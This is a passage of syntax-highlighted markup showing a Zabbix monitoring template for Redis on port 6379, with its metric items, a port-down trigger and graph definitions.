&lt;delay&gt;60&lt;/delay&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">history</span>&gt;7&lt;/<span class=\"built_in\">history</span>&gt;</span><br><span class=\"line\">                    &lt;trends&gt;365&lt;/trends&gt;</span><br><span class=\"line\">                    &lt;status&gt;0&lt;/status&gt;</span><br><span class=\"line\">                    &lt;value_<span class=\"built_in\">type</span>&gt;3&lt;/value_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;allowed_hosts/&gt;</span><br><span class=\"line\">                    &lt;units/&gt;</span><br><span class=\"line\">                    &lt;delta&gt;0&lt;/delta&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securityname/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt;</span><br><span class=\"line\">                    &lt;snmpv3_authpassphrase/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_privpassphrase/&gt;</span><br><span class=\"line\">                    &lt;formula&gt;1&lt;/formula&gt;</span><br><span class=\"line\">                    &lt;delay_flex/&gt;</span><br><span class=\"line\">                    &lt;params/&gt;</span><br><span class=\"line\">                    &lt;ipmi_sensor/&gt;</span><br><span class=\"line\">                    &lt;data_<span class=\"built_in\">type</span>&gt;0&lt;/data_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;authtype&gt;0&lt;/authtype&gt;</span><br><span class=\"line\">                    &lt;username/&gt;</span><br><span class=\"line\">                    &lt;password/&gt;</span><br><span class=\"line\">                    &lt;publickey/&gt;</span><br><span class=\"line\">                    &lt;privatekey/&gt;</span><br><span class=\"line\">                    &lt;port/&gt;</span><br><span class=\"line\">                    &lt;description/&gt;</span><br><span class=\"line\">                    &lt;inventory_link&gt;0&lt;/inventory_link&gt;</span><br><span class=\"line\">                    &lt;applications&gt;</span><br><span class=\"line\">                        &lt;application&gt;</span><br><span class=\"line\">                            &lt;name&gt;Redis_6379&lt;/name&gt;</span><br><span class=\"line\">                        &lt;/application&gt;</span><br><span class=\"line\">                    &lt;/applications&gt;</span><br><span class=\"line\">                    &lt;valuemap/&gt;</span><br><span class=\"line\">                &lt;/item&gt;</span><br><span class=\"line\">                &lt;item&gt;</span><br><span class=\"line\">                    &lt;name&gt;Expired keys_6379&lt;/name&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;snmp_community/&gt;</span><br><span class=\"line\">                    &lt;multiplier&gt;0&lt;/multiplier&gt;</span><br><span class=\"line\">                    &lt;snmp_oid/&gt;</span><br><span class=\"line\">                    &lt;key&gt;redis_stats[6379,expired_keys]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;delay&gt;60&lt;/delay&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">history</span>&gt;7&lt;/<span class=\"built_in\">history</span>&gt;</span><br><span class=\"line\">                    &lt;trends&gt;365&lt;/trends&gt;</span><br><span class=\"line\">                    &lt;status&gt;0&lt;/status&gt;</span><br><span class=\"line\">                    &lt;value_<span class=\"built_in\">type</span>&gt;3&lt;/value_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;allowed_hosts/&gt;</span><br><span class=\"line\">                    &lt;units/&gt;</span><br><span class=\"line\">                    &lt;delta&gt;0&lt;/delta&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securityname/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt;</span><br><span class=\"line\">                    &lt;snmpv3_authpassphrase/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_privpassphrase/&gt;</span><br><span class=\"line\">                    &lt;formula&gt;1&lt;/formula&gt;</span><br><span class=\"line\">                    &lt;delay_flex/&gt;</span><br><span class=\"line\">                    &lt;params/&gt;</span><br><span class=\"line\">                    &lt;ipmi_sensor/&gt;</span><br><span class=\"line\">                    &lt;data_<span class=\"built_in\">type</span>&gt;0&lt;/data_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;authtype&gt;0&lt;/authtype&gt;</span><br><span class=\"line\">                    &lt;username/&gt;</span><br><span class=\"line\">                    &lt;password/&gt;</span><br><span class=\"line\">                    &lt;publickey/&gt;</span><br><span class=\"line\">                    &lt;privatekey/&gt;</span><br><span class=\"line\">                    &lt;port/&gt;</span><br><span class=\"line\">                    &lt;description/&gt;</span><br><span class=\"line\">                    &lt;inventory_link&gt;0&lt;/inventory_link&gt;</span><br><span class=\"line\">                    &lt;applications&gt;</span><br><span class=\"line\">                        &lt;application&gt;</span><br><span class=\"line\">                            &lt;name&gt;Redis_6379&lt;/name&gt;</span><br><span class=\"line\">                        &lt;/application&gt;</span><br><span class=\"line\">                    &lt;/applications&gt;</span><br><span class=\"line\">                    &lt;valuemap/&gt;</span><br><span class=\"line\">                &lt;/item&gt;</span><br><span class=\"line\">                &lt;item&gt;</span><br><span class=\"line\">                    &lt;name&gt;Last save time_6379&lt;/name&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;snmp_community/&gt;</span><br><span class=\"line\">                    &lt;multiplier&gt;0&lt;/multiplier&gt;</span><br><span class=\"line\">                    &lt;snmp_oid/&gt;</span><br><span class=\"line\">                    &lt;key&gt;redis_stats[6379,last_save_time]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;delay&gt;60&lt;/delay&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">history</span>&gt;3&lt;/<span class=\"built_in\">history</span>&gt;</span><br><span class=\"line\">                    &lt;trends&gt;365&lt;/trends&gt;</span><br><span class=\"line\">                    &lt;status&gt;0&lt;/status&gt;</span><br><span class=\"line\">                    &lt;value_<span class=\"built_in\">type</span>&gt;3&lt;/value_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;allowed_hosts/&gt;</span><br><span class=\"line\">                    &lt;units&gt;unixtime&lt;/units&gt;</span><br><span class=\"line\">                    &lt;delta&gt;0&lt;/delta&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securityname/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt;</span><br><span class=\"line\">                    &lt;snmpv3_authpassphrase/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_privpassphrase/&gt;</span><br><span class=\"line\">                    &lt;formula&gt;1&lt;/formula&gt;</span><br><span class=\"line\">                    &lt;delay_flex/&gt;</span><br><span class=\"line\">                    &lt;params/&gt;</span><br><span class=\"line\">                    &lt;ipmi_sensor/&gt;</span><br><span class=\"line\">                    &lt;data_<span class=\"built_in\">type</span>&gt;0&lt;/data_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;authtype&gt;0&lt;/authtype&gt;</span><br><span class=\"line\">                    &lt;username/&gt;</span><br><span class=\"line\">                    &lt;password/&gt;</span><br><span class=\"line\">                    &lt;publickey/&gt;</span><br><span class=\"line\">                    &lt;privatekey/&gt;</span><br><span class=\"line\">                    &lt;port/&gt;</span><br><span class=\"line\">                    &lt;description/&gt;</span><br><span class=\"line\">                    &lt;inventory_link&gt;0&lt;/inventory_link&gt;</span><br><span class=\"line\">                    &lt;applications&gt;</span><br><span class=\"line\">                        &lt;application&gt;</span><br><span class=\"line\">                            &lt;name&gt;Redis_6379&lt;/name&gt;</span><br><span class=\"line\">                        &lt;/application&gt;</span><br><span class=\"line\">                    &lt;/applications&gt;</span><br><span class=\"line\">                    &lt;valuemap/&gt;</span><br><span class=\"line\">                &lt;/item&gt;</span><br><span class=\"line\">                &lt;item&gt;</span><br><span class=\"line\">                    &lt;name&gt;port status_6379&lt;/name&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;snmp_community/&gt;</span><br><span class=\"line\">                    &lt;multiplier&gt;0&lt;/multiplier&gt;</span><br><span class=\"line\">                    &lt;snmp_oid/&gt;</span><br><span class=\"line\">                    &lt;key&gt;net.tcp.listen[6379]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;delay&gt;60&lt;/delay&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">history</span>&gt;7&lt;/<span class=\"built_in\">history</span>&gt;</span><br><span class=\"line\">                    &lt;trends&gt;365&lt;/trends&gt;</span><br><span class=\"line\">                    &lt;status&gt;0&lt;/status&gt;</span><br><span class=\"line\">                    &lt;value_<span class=\"built_in\">type</span>&gt;3&lt;/value_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;allowed_hosts/&gt;</span><br><span class=\"line\">                    &lt;units/&gt;</span><br><span class=\"line\">                    &lt;delta&gt;0&lt;/delta&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securityname/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt;</span><br><span class=\"line\">                    &lt;snmpv3_authpassphrase/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_privpassphrase/&gt;</span><br><span class=\"line\">                    &lt;formula&gt;1&lt;/formula&gt;</span><br><span class=\"line\">                    &lt;delay_flex/&gt;</span><br><span class=\"line\">                    &lt;params/&gt;</span><br><span class=\"line\">                    &lt;ipmi_sensor/&gt;</span><br><span class=\"line\">                    &lt;data_<span class=\"built_in\">type</span>&gt;0&lt;/data_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;authtype&gt;0&lt;/authtype&gt;</span><br><span class=\"line\">                    &lt;username/&gt;</span><br><span class=\"line\">                    &lt;password/&gt;</span><br><span class=\"line\">                    &lt;publickey/&gt;</span><br><span class=\"line\">                    &lt;privatekey/&gt;</span><br><span class=\"line\">                    &lt;port/&gt;</span><br><span class=\"line\">                    &lt;description/&gt;</span><br><span class=\"line\">                    &lt;inventory_link&gt;0&lt;/inventory_link&gt;</span><br><span class=\"line\">                    &lt;applications&gt;</span><br><span class=\"line\">                        &lt;application&gt;</span><br><span class=\"line\">                            &lt;name&gt;Redis_6379&lt;/name&gt;</span><br><span class=\"line\">                        &lt;/application&gt;</span><br><span class=\"line\">                    &lt;/applications&gt;</span><br><span class=\"line\">                    &lt;valuemap/&gt;</span><br><span class=\"line\">                &lt;/item&gt;</span><br><span class=\"line\">                &lt;item&gt;</span><br><span class=\"line\">                    &lt;name&gt;Request rate_6379&lt;/name&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;snmp_community/&gt;</span><br><span class=\"line\">                    &lt;multiplier&gt;0&lt;/multiplier&gt;</span><br><span class=\"line\">                    &lt;snmp_oid/&gt;</span><br><span class=\"line\">                    &lt;key&gt;redis_stats[6379,total_commands_processed]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;delay&gt;60&lt;/delay&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">history</span>&gt;7&lt;/<span class=\"built_in\">history</span>&gt;</span><br><span class=\"line\">                    &lt;trends&gt;365&lt;/trends&gt;</span><br><span class=\"line\">                    &lt;status&gt;0&lt;/status&gt;</span><br><span class=\"line\">                    &lt;value_<span class=\"built_in\">type</span>&gt;3&lt;/value_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;allowed_hosts/&gt;</span><br><span class=\"line\">                    &lt;units/&gt;</span><br><span class=\"line\">                    &lt;delta&gt;1&lt;/delta&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securityname/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt;</span><br><span class=\"line\">                    &lt;snmpv3_authpassphrase/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_privpassphrase/&gt;</span><br><span class=\"line\">                    &lt;formula&gt;1&lt;/formula&gt;</span><br><span class=\"line\">                    &lt;delay_flex/&gt;</span><br><span class=\"line\">                    &lt;params/&gt;</span><br><span class=\"line\">                    &lt;ipmi_sensor/&gt;</span><br><span class=\"line\">                    &lt;data_<span class=\"built_in\">type</span>&gt;0&lt;/data_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;authtype&gt;0&lt;/authtype&gt;</span><br><span class=\"line\">                    &lt;username/&gt;</span><br><span class=\"line\">                    &lt;password/&gt;</span><br><span class=\"line\">                    &lt;publickey/&gt;</span><br><span class=\"line\">                    &lt;privatekey/&gt;</span><br><span class=\"line\">                    &lt;port/&gt;</span><br><span class=\"line\">                    &lt;description/&gt;</span><br><span class=\"line\">                    &lt;inventory_link&gt;0&lt;/inventory_link&gt;</span><br><span class=\"line\">                    &lt;applications&gt;</span><br><span class=\"line\">                        &lt;application&gt;</span><br><span class=\"line\">                            &lt;name&gt;Redis_6379&lt;/name&gt;</span><br><span class=\"line\">                        &lt;/application&gt;</span><br><span class=\"line\">                    &lt;/applications&gt;</span><br><span class=\"line\">                    &lt;valuemap/&gt;</span><br><span class=\"line\">                &lt;/item&gt;</span><br><span class=\"line\">                &lt;item&gt;</span><br><span class=\"line\">                    &lt;name&gt;Role_6379&lt;/name&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;snmp_community/&gt;</span><br><span class=\"line\">                    &lt;multiplier&gt;0&lt;/multiplier&gt;</span><br><span class=\"line\">                    &lt;snmp_oid/&gt;</span><br><span class=\"line\">                    &lt;key&gt;redis_stats[6379,role]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;delay&gt;60&lt;/delay&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">history</span>&gt;3&lt;/<span class=\"built_in\">history</span>&gt;</span><br><span class=\"line\">                    &lt;trends&gt;365&lt;/trends&gt;</span><br><span class=\"line\">                    &lt;status&gt;0&lt;/status&gt;</span><br><span class=\"line\">                    &lt;value_<span class=\"built_in\">type</span>&gt;1&lt;/value_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;allowed_hosts/&gt;</span><br><span class=\"line\">                    &lt;units/&gt;</span><br><span class=\"line\">                    &lt;delta&gt;0&lt;/delta&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securityname/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt;</span><br><span class=\"line\">                    &lt;snmpv3_authpassphrase/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_privpassphrase/&gt;</span><br><span class=\"line\">                    &lt;formula&gt;1&lt;/formula&gt;</span><br><span class=\"line\">                    &lt;delay_flex/&gt;</span><br><span class=\"line\">                    &lt;params/&gt;</span><br><span class=\"line\">                    &lt;ipmi_sensor/&gt;</span><br><span class=\"line\">                    &lt;data_<span class=\"built_in\">type</span>&gt;0&lt;/data_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;authtype&gt;0&lt;/authtype&gt;</span><br><span class=\"line\">                    &lt;username/&gt;</span><br><span class=\"line\">                    &lt;password/&gt;</span><br><span class=\"line\">                    &lt;publickey/&gt;</span><br><span class=\"line\">                    &lt;privatekey/&gt;</span><br><span class=\"line\">                    &lt;port/&gt;</span><br><span class=\"line\">                    &lt;description/&gt;</span><br><span class=\"line\">                    &lt;inventory_link&gt;0&lt;/inventory_link&gt;</span><br><span class=\"line\">                    &lt;applications&gt;</span><br><span class=\"line\">                        &lt;application&gt;</span><br><span class=\"line\">                            &lt;name&gt;Redis_6379&lt;/name&gt;</span><br><span class=\"line\">                        &lt;/application&gt;</span><br><span class=\"line\">                    &lt;/applications&gt;</span><br><span class=\"line\">                    &lt;valuemap/&gt;</span><br><span class=\"line\">                &lt;/item&gt;</span><br><span class=\"line\">                &lt;item&gt;</span><br><span class=\"line\">                    &lt;name&gt;Uptime <span class=\"keyword\">in</span> seconds_6379&lt;/name&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;snmp_community/&gt;</span><br><span class=\"line\">                    &lt;multiplier&gt;0&lt;/multiplier&gt;</span><br><span class=\"line\">                    &lt;snmp_oid/&gt;</span><br><span class=\"line\">                    &lt;key&gt;redis_stats[6379,uptime_<span class=\"keyword\">in</span>_seconds]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;delay&gt;60&lt;/delay&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">history</span>&gt;7&lt;/<span class=\"built_in\">history</span>&gt;</span><br><span class=\"line\">                    &lt;trends&gt;365&lt;/trends&gt;</span><br><span class=\"line\">                    &lt;status&gt;0&lt;/status&gt;</span><br><span class=\"line\">                    &lt;value_<span class=\"built_in\">type</span>&gt;3&lt;/value_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;allowed_hosts/&gt;</span><br><span class=\"line\">                    &lt;units&gt;uptime&lt;/units&gt;</span><br><span class=\"line\">                    &lt;delta&gt;0&lt;/delta&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securityname/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt;</span><br><span class=\"line\">                    &lt;snmpv3_authpassphrase/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_privpassphrase/&gt;</span><br><span class=\"line\">                    &lt;formula&gt;1&lt;/formula&gt;</span><br><span class=\"line\">                    &lt;delay_flex/&gt;</span><br><span class=\"line\">                    &lt;params/&gt;</span><br><span class=\"line\">                    &lt;ipmi_sensor/&gt;</span><br><span class=\"line\">                    &lt;data_<span class=\"built_in\">type</span>&gt;0&lt;/data_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;authtype&gt;0&lt;/authtype&gt;</span><br><span class=\"line\">                    &lt;username/&gt;</span><br><span class=\"line\">                    &lt;password/&gt;</span><br><span class=\"line\">                    &lt;publickey/&gt;</span><br><span class=\"line\">                    &lt;privatekey/&gt;</span><br><span class=\"line\">                    &lt;port/&gt;</span><br><span class=\"line\">                    &lt;description/&gt;</span><br><span class=\"line\">                    &lt;inventory_link&gt;0&lt;/inventory_link&gt;</span><br><span class=\"line\">                    &lt;applications&gt;</span><br><span class=\"line\">                        &lt;application&gt;</span><br><span class=\"line\">                            &lt;name&gt;Redis_6379&lt;/name&gt;</span><br><span class=\"line\">                        &lt;/application&gt;</span><br><span class=\"line\">                    &lt;/applications&gt;</span><br><span class=\"line\">                    &lt;valuemap/&gt;</span><br><span class=\"line\">                &lt;/item&gt;</span><br><span class=\"line\">                &lt;item&gt;</span><br><span class=\"line\">                    &lt;name&gt;Used memory_6379&lt;/name&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;snmp_community/&gt;</span><br><span class=\"line\">                    &lt;multiplier&gt;0&lt;/multiplier&gt;</span><br><span class=\"line\">                    &lt;snmp_oid/&gt;</span><br><span class=\"line\">                    &lt;key&gt;redis_stats[6379,used_memory:]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;delay&gt;60&lt;/delay&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">history</span>&gt;7&lt;/<span class=\"built_in\">history</span>&gt;</span><br><span class=\"line\">                    &lt;trends&gt;365&lt;/trends&gt;</span><br><span class=\"line\">                    &lt;status&gt;0&lt;/status&gt;</span><br><span class=\"line\">                    &lt;value_<span class=\"built_in\">type</span>&gt;3&lt;/value_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;allowed_hosts/&gt;</span><br><span class=\"line\">                    &lt;units/&gt;</span><br><span class=\"line\">                    &lt;delta&gt;0&lt;/delta&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securityname/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt;</span><br><span class=\"line\">                    &lt;snmpv3_authpassphrase/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_privpassphrase/&gt;</span><br><span class=\"line\">                    &lt;formula&gt;1&lt;/formula&gt;</span><br><span class=\"line\">                    &lt;delay_flex/&gt;</span><br><span class=\"line\">                    &lt;params/&gt;</span><br><span class=\"line\">                    &lt;ipmi_sensor/&gt;</span><br><span class=\"line\">                    &lt;data_<span class=\"built_in\">type</span>&gt;0&lt;/data_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;authtype&gt;0&lt;/authtype&gt;</span><br><span class=\"line\">                    &lt;username/&gt;</span><br><span class=\"line\">                    &lt;password/&gt;</span><br><span class=\"line\">                    &lt;publickey/&gt;</span><br><span class=\"line\">                    &lt;privatekey/&gt;</span><br><span class=\"line\">                    &lt;port/&gt;</span><br><span class=\"line\">                    &lt;description/&gt;</span><br><span class=\"line\">                    &lt;inventory_link&gt;0&lt;/inventory_link&gt;</span><br><span class=\"line\">                    &lt;applications&gt;</span><br><span class=\"line\">                        &lt;application&gt;</span><br><span class=\"line\">                            &lt;name&gt;Redis_6379&lt;/name&gt;</span><br><span class=\"line\">                        &lt;/application&gt;</span><br><span class=\"line\">                    &lt;/applications&gt;</span><br><span class=\"line\">                    &lt;valuemap/&gt;</span><br><span class=\"line\">                &lt;/item&gt;</span><br><span class=\"line\">                &lt;item&gt;</span><br><span class=\"line\">                    &lt;name&gt;Used_memory_rss_6379&lt;/name&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;snmp_community/&gt;</span><br><span class=\"line\">                    &lt;multiplier&gt;0&lt;/multiplier&gt;</span><br><span class=\"line\">                    &lt;snmp_oid/&gt;</span><br><span class=\"line\">                    &lt;key&gt;redis_stats[6379,used_memory_rss]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;delay&gt;60&lt;/delay&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">history</span>&gt;7&lt;/<span class=\"built_in\">history</span>&gt;</span><br><span class=\"line\">                    &lt;trends&gt;365&lt;/trends&gt;</span><br><span class=\"line\">                    &lt;status&gt;0&lt;/status&gt;</span><br><span class=\"line\">                    &lt;value_<span class=\"built_in\">type</span>&gt;3&lt;/value_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;allowed_hosts/&gt;</span><br><span class=\"line\">                    &lt;units/&gt;</span><br><span class=\"line\">                    &lt;delta&gt;0&lt;/delta&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securityname/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt;</span><br><span class=\"line\">                    &lt;snmpv3_authpassphrase/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_privpassphrase/&gt;</span><br><span class=\"line\">                    &lt;formula&gt;1&lt;/formula&gt;</span><br><span class=\"line\">                    &lt;delay_flex/&gt;</span><br><span class=\"line\">                    &lt;params/&gt;</span><br><span class=\"line\">                    &lt;ipmi_sensor/&gt;</span><br><span class=\"line\">                    &lt;data_<span class=\"built_in\">type</span>&gt;0&lt;/data_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;authtype&gt;0&lt;/authtype&gt;</span><br><span class=\"line\">                    &lt;username/&gt;</span><br><span class=\"line\">                    &lt;password/&gt;</span><br><span class=\"line\">                    &lt;publickey/&gt;</span><br><span class=\"line\">                    &lt;privatekey/&gt;</span><br><span class=\"line\">                    &lt;port/&gt;</span><br><span class=\"line\">                    &lt;description/&gt;</span><br><span class=\"line\">                    &lt;inventory_link&gt;0&lt;/inventory_link&gt;</span><br><span class=\"line\">                    &lt;applications&gt;</span><br><span class=\"line\">                        &lt;application&gt;</span><br><span class=\"line\">                            &lt;name&gt;Redis_6379&lt;/name&gt;</span><br><span class=\"line\">                        &lt;/application&gt;</span><br><span class=\"line\">                    &lt;/applications&gt;</span><br><span class=\"line\">                    &lt;valuemap/&gt;</span><br><span class=\"line\">                &lt;/item&gt;</span><br><span class=\"line\">            &lt;/items&gt;</span><br><span class=\"line\">            &lt;discovery_rules/&gt;</span><br><span class=\"line\">            &lt;macros/&gt;</span><br><span class=\"line\">            &lt;templates/&gt;</span><br><span class=\"line\">            &lt;screens/&gt;</span><br><span class=\"line\">        &lt;/template&gt;</span><br><span class=\"line\">    &lt;/templates&gt;</span><br><span class=\"line\">    &lt;triggers&gt;</span><br><span class=\"line\">        &lt;trigger&gt;</span><br><span class=\"line\">            &lt;expression&gt;{Templates Redis_6379:net.tcp.listen[6379].count(<span class=\"comment\">#3,0,&amp;quot;eq&amp;quot;)}=3&lt;/expression&gt;</span></span><br><span class=\"line\">            &lt;name&gt;Redis port 6379 is not running&lt;/name&gt;</span><br><span class=\"line\">            &lt;url/&gt;</span><br><span class=\"line\">            &lt;status&gt;0&lt;/status&gt;</span><br><span class=\"line\">            &lt;priority&gt;4&lt;/priority&gt;</span><br><span class=\"line\">            &lt;description/&gt;</span><br><span class=\"line\">            &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">            &lt;dependencies/&gt;</span><br><span class=\"line\">        &lt;/trigger&gt;</span><br><span class=\"line\">    &lt;/triggers&gt;</span><br><span class=\"line\">    &lt;graphs&gt;</span><br><span class=\"line\">        &lt;graph&gt;</span><br><span class=\"line\">            &lt;name&gt;Redis key_6379&lt;/name&gt;</span><br><span class=\"line\">            &lt;width&gt;900&lt;/width&gt;</span><br><span class=\"line\">            &lt;height&gt;200&lt;/height&gt;</span><br><span class=\"line\">            &lt;yaxismin&gt;0.0000&lt;/yaxismin&gt;</span><br><span class=\"line\">            &lt;yaxismax&gt;100.0000&lt;/yaxismax&gt;</span><br><span class=\"line\">            &lt;show_work_period&gt;1&lt;/show_work_period&gt;</span><br><span class=\"line\">            &lt;show_triggers&gt;1&lt;/show_triggers&gt;</span><br><span class=\"line\">            &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">            &lt;show_legend&gt;1&lt;/show_legend&gt;</span><br><span class=\"line\">            &lt;show_3d&gt;0&lt;/show_3d&gt;</span><br><span class=\"line\">            &lt;percent_left&gt;0.0000&lt;/percent_left&gt;</span><br><span class=\"line\">            &lt;percent_right&gt;0.0000&lt;/percent_right&gt;</span><br><span class=\"line\">            &lt;ymin_<span class=\"built_in\">type</span>_1&gt;0&lt;/ymin_<span class=\"built_in\">type</span>_1&gt;</span><br><span class=\"line\">            &lt;ymax_<span class=\"built_in\">type</span>_1&gt;0&lt;/ymax_<span class=\"built_in\">type</span>_1&gt;</span><br><span class=\"line\">            &lt;ymin_item_1&gt;0&lt;/ymin_item_1&gt;</span><br><span class=\"line\">            &lt;ymax_item_1&gt;0&lt;/ymax_item_1&gt;</span><br><span class=\"line\">            &lt;graph_items&gt;</span><br><span class=\"line\">                &lt;graph_item&gt;</span><br><span class=\"line\">                    &lt;sortorder&gt;0&lt;/sortorder&gt;</span><br><span class=\"line\">                    &lt;drawtype&gt;0&lt;/drawtype&gt;</span><br><span class=\"line\">                    &lt;color&gt;C80000&lt;/color&gt;</span><br><span class=\"line\">                    &lt;yaxisside&gt;0&lt;/yaxisside&gt;</span><br><span class=\"line\">                    &lt;calc_fnc&gt;2&lt;/calc_fnc&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;item&gt;</span><br><span class=\"line\">                        &lt;host&gt;Templates Redis_6379&lt;/host&gt;</span><br><span class=\"line\">                        &lt;key&gt;redis_stats[6379,evicted_keys]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;/item&gt;</span><br><span class=\"line\">                &lt;/graph_item&gt;</span><br><span class=\"line\">                &lt;graph_item&gt;</span><br><span class=\"line\">                    &lt;sortorder&gt;1&lt;/sortorder&gt;</span><br><span class=\"line\">                    &lt;drawtype&gt;0&lt;/drawtype&gt;</span><br><span class=\"line\">                    &lt;color&gt;00C800&lt;/color&gt;</span><br><span class=\"line\">                    &lt;yaxisside&gt;0&lt;/yaxisside&gt;</span><br><span class=\"line\">                    &lt;calc_fnc&gt;2&lt;/calc_fnc&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;item&gt;</span><br><span class=\"line\">                        &lt;host&gt;Templates Redis_6379&lt;/host&gt;</span><br><span class=\"line\">                        &lt;key&gt;redis_stats[6379,expired_keys]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;/item&gt;</span><br><span class=\"line\">                &lt;/graph_item&gt;</span><br><span class=\"line\">            &lt;/graph_items&gt;</span><br><span class=\"line\">        &lt;/graph&gt;</span><br><span class=\"line\">        &lt;graph&gt;</span><br><span class=\"line\">            &lt;name&gt;Redis Last_save_time_6379&lt;/name&gt;</span><br><span class=\"line\">            &lt;width&gt;900&lt;/width&gt;</span><br><span class=\"line\">            &lt;height&gt;200&lt;/height&gt;</span><br><span class=\"line\">            &lt;yaxismin&gt;0.0000&lt;/yaxismin&gt;</span><br><span class=\"line\">            &lt;yaxismax&gt;100.0000&lt;/yaxismax&gt;</span><br><span class=\"line\">            &lt;show_work_period&gt;1&lt;/show_work_period&gt;</span><br><span class=\"line\">            